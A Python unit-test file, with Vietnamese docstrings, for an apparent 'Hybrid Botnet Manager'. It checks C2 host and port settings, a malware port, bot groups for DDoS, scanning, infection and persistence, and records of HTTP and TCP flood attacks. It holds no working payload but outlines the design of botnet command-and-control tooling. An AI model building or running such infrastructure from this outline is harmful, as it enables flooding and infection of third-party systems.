#!/usr/bin/env python3
"""
Test suite cho Hybrid Botnet Manager
Kiểm tra các chức năng của hybrid botnet management system
"""

import unittest
import sys
import os
import json
import tempfile
from unittest.mock import patch, MagicMock, mock_open

# Add bane to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'bane'))

class TestHybridBotnetManager(unittest.TestCase):
    """Test Hybrid Botnet Manager functionality"""
    
    def setUp(self):
        """Setup test environment"""
        try:
            from hybrid_botnet_manager import HybridBotnetManager
            self.manager = HybridBotnetManager()
        except ImportError:
            self.skipTest("Hybrid Botnet Manager not available")
    
    def test_config_loading(self):
        """Test configuration loading"""
        config = self.manager.load_config()
        
        # Verify default config structure
        required_keys = ['c2_host', 'c2_users_port', 'c2_bots_port', 'malware_port']
        for key in required_keys:
            self.assertIn(key, config)
        
        # Verify port numbers are integers
        self.assertIsInstance(config['c2_users_port'], int)
        self.assertIsInstance(config['c2_bots_port'], int)
        self.assertIsInstance(config['malware_port'], int)
    
    @patch('builtins.open', new_callable=mock_open, 
           read_data='{"c2_host": "test.example.com", "c2_users_port": 12345}')
    @patch('os.path.exists', return_value=True)
    def test_config_file_loading(self, mock_exists, mock_file):
        """Test loading config from file"""
        config = self.manager.load_config()
        
        self.assertEqual(config['c2_host'], 'test.example.com')
        self.assertEqual(config['c2_users_port'], 12345)
    
    def test_bot_group_initialization(self):
        """Test bot group initialization"""
        expected_groups = ['ddos_bots', 'scanner_bots', 'infector_bots', 'persistence_bots']
        
        for group in expected_groups:
            self.assertIn(group, self.manager.bot_groups)
            self.assertIsInstance(self.manager.bot_groups[group], list)
    
    def test_attack_counter_initialization(self):
        """Test attack counter initialization"""
        self.assertEqual(self.manager.attack_counter, 0)
        self.assertIsInstance(self.manager.active_attacks, dict)
    
    @patch('os.path.getmtime', return_value=1234567890)
    def test_config_mtime_tracking(self, mock_getmtime):
        """Test configuration modification time tracking"""
        mtime = self.manager.get_config_mtime()
        self.assertEqual(mtime, 1234567890)

class TestBotManagement(unittest.TestCase):
    """Test bot management functionality"""
    
    def setUp(self):
        """Setup test environment"""
        try:
            from hybrid_botnet_manager import HybridBotnetManager
            self.manager = HybridBotnetManager()
        except ImportError:
            self.skipTest("Hybrid Botnet Manager not available")
    
    def test_add_bot_to_group(self):
        """Test adding bots to groups"""
        bot_info = {
            'id': 'bot_001',
            'ip': '192.168.1.100',
            'capabilities': ['ddos', 'scan']
        }
        
        # Add to ddos_bots group
        self.manager.bot_groups['ddos_bots'].append(bot_info)
        
        self.assertEqual(len(self.manager.bot_groups['ddos_bots']), 1)
        self.assertEqual(self.manager.bot_groups['ddos_bots'][0]['id'], 'bot_001')
    
    def test_bot_group_filtering(self):
        """Test filtering bots by capability"""
        bots = [
            {'id': 'bot_001', 'capabilities': ['ddos']},
            {'id': 'bot_002', 'capabilities': ['scan']},
            {'id': 'bot_003', 'capabilities': ['ddos', 'scan']}
        ]
        
        # Filter bots with ddos capability
        ddos_bots = [bot for bot in bots if 'ddos' in bot['capabilities']]
        
        self.assertEqual(len(ddos_bots), 2)
        self.assertIn('bot_001', [bot['id'] for bot in ddos_bots])
        self.assertIn('bot_003', [bot['id'] for bot in ddos_bots])

class TestAttackManagement(unittest.TestCase):
    """Test attack management functionality"""
    
    def setUp(self):
        """Setup test environment"""
        try:
            from hybrid_botnet_manager import HybridBotnetManager
            self.manager = HybridBotnetManager()
        except ImportError:
            self.skipTest("Hybrid Botnet Manager not available")
    
    def test_attack_id_generation(self):
        """Test attack ID generation"""
        initial_counter = self.manager.attack_counter
        
        # Simulate attack creation
        attack_id = f"attack_{self.manager.attack_counter + 1}"
        self.manager.attack_counter += 1
        self.manager.active_attacks[attack_id] = {
            'type': 'http_flood',
            'target': 'example.com',
            'status': 'active'
        }
        
        self.assertEqual(self.manager.attack_counter, initial_counter + 1)
        self.assertIn(attack_id, self.manager.active_attacks)
    
    def test_attack_status_tracking(self):
        """Test attack status tracking"""
        attack_id = "attack_test"
        attack_info = {
            'type': 'tcp_flood',
            'target': '192.168.1.1',
            'status': 'preparing'
        }
        
        self.manager.active_attacks[attack_id] = attack_info
        
        # Update status
        self.manager.active_attacks[attack_id]['status'] = 'active'
        
        self.assertEqual(self.manager.active_attacks[attack_id]['status'], 'active')

class TestSecurityFeatures(unittest.TestCase):
    """Test security features"""
    
    def setUp(self):
        """Setup test environment"""
        try:
            from hybrid_botnet_manager import HybridBotnetManager
            self.manager = HybridBotnetManager()
        except ImportError:
            self.skipTest("Hybrid Botnet Manager not available")
    
    def test_encryption_key_present(self):
        """Test encryption key is configured"""
        config = self.manager.config
        self.assertIn('encryption_key', config)
        self.assertIsInstance(config['encryption_key'], str)
        self.assertGreater(len(config['encryption_key']), 0)
    
    def test_max_limits_configured(self):
        """Test maximum limits are configured"""
        config = self.manager.config
        
        self.assertIn('max_users', config)
        self.assertIn('max_bots', config)
        
        self.assertIsInstance(config['max_users'], int)
        self.assertIsInstance(config['max_bots'], int)
        self.assertGreater(config['max_users'], 0)
        self.assertGreater(config['max_bots'], 0)

class TestWebInterfaceComponents(unittest.TestCase):
    """Test web interface components"""
    
    def setUp(self):
        """Setup test environment"""
        try:
            from hybrid_botnet_manager import HybridBotnetManager
            self.manager = HybridBotnetManager()
        except ImportError:
            self.skipTest("Hybrid Botnet Manager not available")
    
    def test_web_app_initialization(self):
        """Test web app can be initialized"""
        # Test that web_app and socketio can be None initially
        self.assertIsNone(self.manager.web_app)
        self.assertIsNone(self.manager.socketio)
    
    def test_web_port_configuration(self):
        """Test web port is properly configured"""
        config = self.manager.config
        self.assertIn('web_port', config)
        self.assertIsInstance(config['web_port'], int)
        self.assertGreater(config['web_port'], 1024)  # Non-privileged port

if __name__ == '__main__':
    # Run tests với verbose output
    unittest.main(verbosity=2)
